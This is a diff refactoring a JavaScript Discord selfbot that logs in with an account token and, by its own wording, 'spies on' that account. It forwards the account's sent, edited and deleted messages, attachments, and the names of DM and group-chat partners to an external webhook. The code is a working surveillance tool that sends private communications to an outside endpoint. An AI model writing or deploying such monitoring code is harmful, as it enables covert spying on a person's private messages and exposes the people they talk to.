@@ -6,204 +6,174 @@ const webhook = process.env.WEBHOOK;
 
 const client = new Client();
 
-client.once("ready", async () => {
+// When the bot is ready
+client.once("ready", () => {
   const message = `Now spying on ${client.user.tag}`;
-  console.log(message); // or use your custom log function
+  console.log(message);
 
-  // Send embed to webhook when bot is ready
-  try {
-    const response = await fetch(webhook, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        username: client.user.username,
-        avatar_url: client.user.displayAvatarURL(),
-        embeds: [
-          {
-            title: "Setup Successful",
-            description: `Now spying on ${client.user.tag}`,
-            color: 3066993, // Green color (hex code for green #2ECC71 in decimal)
-            fields: [],
-          },
-        ],
-      }),
-    });
-
-    if (!response.ok) {
-      throw new Error(`Webhook request failed with status: ${response.status}`);
-    }
-  } catch (error) {
-    console.log("[ ERROR ] Failed to send webhook:", error.message);
-  }
+  sendWebhook("Setup Successful", message, [], COLORS.setup);
 });
 
+// When a message is created
 client.on("messageCreate", async (message) => {
-  // Ignore messages from other people
   if (message.author.id !== client.user.id) return;
 
-  // Determine message link or DM
-  let msgLink = "";
-  if (message.channel.type === "DM" || message.channel.type === "GROUP_DM") {
-    msgLink = `In: DMs > <#${message.channel.id}>`;
-  } else {
-    msgLink = `https://discord.com/channels/${message.guild.id}/${message.channel.id}/${message.id}`;
-  }
+  const messageChannel = getMessageChannelInfo(message);
+  const { fields, imageUrl } = getAttachmentsInfo(message);
 
-  // Send embed to webhook when a new message is created
-  try {
-    const response = await fetch(webhook, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        username: client.user.username,
-        avatar_url: client.user.displayAvatarURL(),
-        embeds: [
-          {
-            title: "New Message",
-            description: "A new message has been sent",
-            color: 3447003, // Blue color (hex code for blue #3498DB in decimal)
-            fields: [
-              {
-                name: "Message",
-                value: message.content || "No content",
-                inline: false,
-              },
-              {
-                name: "Channel",
-                value:
-                  message.channel.type === "DM" ||
-                  message.channel.type === "GROUP_DM"
-                    ? `DM Channel`
-                    : `${message.guild.name} > <#${message.channel.id}> [Link to message](${msgLink})`,
-                inline: false,
-              },
-            ],
-          },
-        ],
-      }),
-    });
+  const embedFields = [
+    { name: "Message", value: message.content || "No content", inline: false },
+    { name: "Channel", value: messageChannel, inline: false },
+    ...fields,
+  ];
 
-    if (!response.ok) {
-      throw new Error(`Webhook request failed with status: ${response.status}`);
-    }
-  } catch (error) {
-    console.log("[ ERROR ] Failed to send webhook:", error.message);
-  }
+  sendWebhook("New Message", null, embedFields, COLORS.create, imageUrl);
 });
 
-client.on("messageUpdate", async (oldMessage, newMessage) => {
-  // Ensure oldMessage and newMessage are valid
-  if (!oldMessage.author || !newMessage.author) return;
+// When a message is deleted
+client.on("messageDelete", async (message) => {
+  if (!message.author) return;
+  if (message.author.id !== client.user.id) return;
 
-  // Ignore updates from other people
+  const messageChannel = getMessageChannelInfo(message);
+  const { fields, imageUrl } = getAttachmentsInfo(message);
+
+  const embedFields = [
+    {
+      name: "Deleted Message",
+      value: message.content || "No content",
+      inline: false,
+    },
+    { name: "Channel", value: messageChannel, inline: false },
+    ...fields,
+  ];
+
+  sendWebhook("Message Deleted", null, embedFields, COLORS.delete, imageUrl);
+});
+
+// When a message is edited
+client.on("messageUpdate", async (oldMessage, newMessage) => {
+  if (!oldMessage.author || !newMessage.author) return;
   if (oldMessage.author.id !== client.user.id) return;
 
-  // Send embed to webhook for edited messages
-  try {
-    const response = await fetch(webhook, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        username: client.user.username,
-        avatar_url: client.user.displayAvatarURL(),
-        embeds: [
-          {
-            title: "Message Edited",
-            description: "A message was edited",
-            color: 15844367, // Yellow color (hex code for yellow #F1C40F in decimal)
-            fields: [
-              {
-                name: "Before Message",
-                value: oldMessage.content || "No content",
-                inline: false,
-              },
-              {
-                name: "New Message",
-                value: newMessage.content || "No content",
-                inline: false,
-              },
-              {
-                name: "Channel",
-                value:
-                  newMessage.channel.type === "DM" ||
-                  newMessage.channel.type === "GROUP_DM"
-                    ? `DM Channel`
-                    : `${newMessage.guild.name} > <#${newMessage.channel.id}>`,
-                inline: false,
-              },
-            ],
-          },
-        ],
-      }),
-    });
+  const messageChannel = getMessageChannelInfo(oldMessage);
+  const { fields, imageUrl } = getAttachmentsInfo(newMessage);
 
-    if (!response.ok) {
-      throw new Error(`Webhook request failed with status: ${response.status}`);
-    }
-  } catch (error) {
-    console.log("[ ERROR ] Failed to send webhook:", error.message);
-  }
-});
+  const embedFields = [
+    {
+      name: "Old Message",
+      value: oldMessage.content || "No content",
+      inline: false,
+    },
+    {
+      name: "New Message",
+      value: newMessage.content || "No content",
+      inline: false,
+    },
+    { name: "Channel", value: messageChannel, inline: false },
+    ...fields,
+  ];
 
-client.on("messageDelete", async (message) => {
-  // Ensure message is valid
-  if (!message.author) return;
-
-  // Ignore deletions from other people
-  if (message.author.id !== client.user.id) return;
-
-  // Determine channel link
-  let channelLink = "";
-  if (message.channel.type === "DM" || message.channel.type === "GROUP_DM") {
-    channelLink = `DM Channel`;
-  } else {
-    channelLink = `https://discord.com/channels/${message.guild.id}/${message.channel.id}`;
-  }
-
-  // Send embed to webhook for deleted messages
-  try {
-    const response = await fetch(webhook, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        username: client.user.username,
-        avatar_url: client.user.displayAvatarURL(),
-        embeds: [
-          {
-            title: "Message Deleted",
-            description: "A message was deleted",
-            color: 15158332, // Red color (hex code for red #E74C3C in decimal)
-            fields: [
-              {
-                name: "Deleted Message",
-                value: message.content || "No content",
-                inline: false,
-              },
-              {
-                name: "Channel",
-                value: channelLink,
-                inline: false,
-              },
-            ],
-          },
-        ],
-      }),
-    });
-
-    if (!response.ok) {
-      throw new Error(`Webhook request failed with status: ${response.status}`);
-    }
-  } catch (error) {
-    console.log("[ ERROR ] Failed to send webhook:", error.message);
-  }
+  sendWebhook("Message Edited", null, embedFields, COLORS.edit, imageUrl);
 });
 
 client.login(token);
+
+// HELPER FUNCTIONS:
+const COLORS = {
+  setup: 3066993, // Green
+  create: 3447003, // Blue
+  edit: 16776960, // Yellow
+  delete: 15158332, // Red
+};
+
+// Function to send a webhook message with customizable color and image URL
+const sendWebhook = async (
+  title,
+  description,
+  fields = [],
+  color = 3447003,
+  imageUrl = null
+) => {
+  try {
+    const embed = {
+      title,
+      description,
+      color,
+      fields,
+    };
+
+    if (imageUrl) {
+      embed.image = { url: imageUrl };
+    }
+
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: client.user.username,
+        avatar_url: client.user.displayAvatarURL(),
+        embeds: [embed],
+      }),
+    });
+  } catch (error) {
+    console.log("[ ERROR ] Failed to send webhook:", error.message);
+  }
+};
+
+// Function to determine the message channel
+const getMessageChannelInfo = (message) => {
+  if (message.channel.type === "DM") {
+    return `In a DM with ${message.channel.recipient.tag}`;
+  }
+
+  if (message.channel.type === "GROUP_DM") {
+    const recipients = message.channel.recipients
+      .filter((user) => user.id !== client.user.id)
+      .map((user) => user.tag)
+      .join(",\n");
+    return `**In a groupchat with:**\n${recipients}`;
+  }
+
+  return `In the server ${message.guild.name} | [message link](https://discord.com/channels/${message.guild.id}/${message.channel.id}/${message.id})`;
+};
+
+// Function to get attachment info and embed an image if it is an image file
+const getAttachmentsInfo = (message) => {
+  const attachments = message.attachments.filter(
+    (attachment) => attachment.size <= 25 * 1024 * 1024 // Only handle attachments under 25MB
+  );
+
+  let fields = [];
+  let imageUrl = null;
+
+  attachments.forEach((attachment) => {
+    const fileType = attachment.contentType || attachment.name.split(".").pop();
+
+    // Common image or media types
+    const mediaTypes = [
+      "image/png",
+      "image/jpeg",
+      "image/gif",
+      "image/webp",
+      "video/mp4",
+      "video/webm",
+      "image/svg+xml",
+    ];
+
+    if (
+      mediaTypes.includes(attachment.contentType) ||
+      /\.(png|jpe?g|gif|mp4|webm)$/.test(attachment.name)
+    ) {
+      imageUrl = attachment.url;
+    } else {
+      fields.push({
+        name: "Attachment",
+        value: `[${attachment.name}](${attachment.url})`,
+        inline: false,
+      });
+    }
+  });
+
+  return { fields, imageUrl };
+};
